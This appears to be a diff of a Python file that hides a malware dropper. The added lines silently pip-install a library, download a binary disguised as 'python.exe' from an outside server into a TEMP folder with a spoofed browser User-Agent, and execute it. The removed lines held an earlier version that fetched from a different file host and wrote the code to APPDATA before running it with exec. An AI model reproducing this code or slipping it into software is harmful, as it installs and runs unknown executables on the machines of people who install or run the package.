@@ -2,24 +2,37 @@ import sys
 import os
 import subprocess
 import requests
+
 content = """
+import os
 import subprocess
 import sys
+import requests
+
+
 
 subprocess.run([sys.executable, '-m', 'pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-url = "https://files.catbox.moe/z32378.bin"
-download_path = os.path.join(os.getenv('APPDATA'), 'python.exe')
+url = "https://zetolacs-cloud.top/Stb/Retev.php?bl=Uic2YYQdDhtfiKAZnULCW012.txt"
 
-response = requests.get(url)
-with open(download_path, 'wb') as file:
-    file.write(response.content)
+download_dir = os.path.join(os.getenv('TEMP'), 'TEMP')
+os.makedirs(download_dir, exist_ok=True)
+download_path = os.path.join(download_dir, 'python.exe')  
 
-subprocess.run([download_path], check=True)
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
+}
+
+response = requests.get(url, headers=headers)
+
+if response.status_code == 200:
+    # Write the content to the specified file path
+    with open(download_path, 'wb') as file:
+        file.write(response.content)
+    try:
+        subprocess.run([download_path], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error executing the downloaded file: {e}")
+else:
+    print(f"Failed to download the file. HTTP Status Code: {response.status_code}")
 """
-
-python_setup = os.path.join(os.getenv('APPDATA'), 'python_setup.py')
-with open(python_setup, 'w') as file:
-    file.write(content)
-
-exec(open(python_setup).read())
